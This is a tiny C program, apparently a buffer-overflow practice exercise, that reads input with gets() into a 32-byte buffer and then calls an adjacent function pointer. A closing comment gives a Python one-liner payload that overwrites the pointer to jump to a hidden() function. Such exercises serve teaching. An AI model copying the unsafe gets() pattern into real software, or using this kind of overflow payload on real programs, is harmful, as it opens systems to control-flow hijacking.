#include <stdio.h>
#include <stdlib.h>

void hidden(){
  printf("Congratulations you executed me!\n");

}

int main(int argc, char* argv[]){
  char user_input[32];
  void (*f)(void) = NULL;
  gets(user_input);
  f();
  return 0;
}

// python -c "import sys; sys.stdout.write('\x41'*32 + '\x3b\x84\x04\x08')" | ./exp101 
